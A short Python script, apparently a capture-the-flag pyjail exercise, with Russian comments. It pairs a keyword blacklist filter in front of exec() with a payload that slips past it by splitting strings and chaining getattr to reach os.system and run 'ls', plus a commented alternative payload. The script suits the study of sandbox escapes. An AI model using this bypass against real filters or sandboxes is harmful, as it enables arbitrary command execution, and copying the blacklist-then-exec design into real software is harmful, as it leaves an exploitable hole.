#!/bin/python3.12
import string

# getattr заменяет точки -> getattr() с __getitem__ заменяет квадратные скобки
# code = "getattr(getattr(getattr(getattr(getattr(globals(), '__getitem__')('__built'+'ins__'), '__dict__'), '__getitem__')('__imp'+'ort__')('o'+'s'), '__dict__'), '__getitem__')('sys'+'tem')('ls')"
code = "getattr(getattr(getattr(globals(),'get')('__bu'+'iltins__'),'__imp'+'ort__')('o'+'s'),'sys'+'tem')('ls')"

# code = input('Your scientific computation: ')
code = ''.join([c for c in code if c in string.printable])

for keyword in ['eval', 'exec', 'import', 'open', 'system', 'os', 'builtins', '.', '[', ']']:
    if keyword in code:
        print('You are jailed!', keyword)
        break
else:
    exec(code)





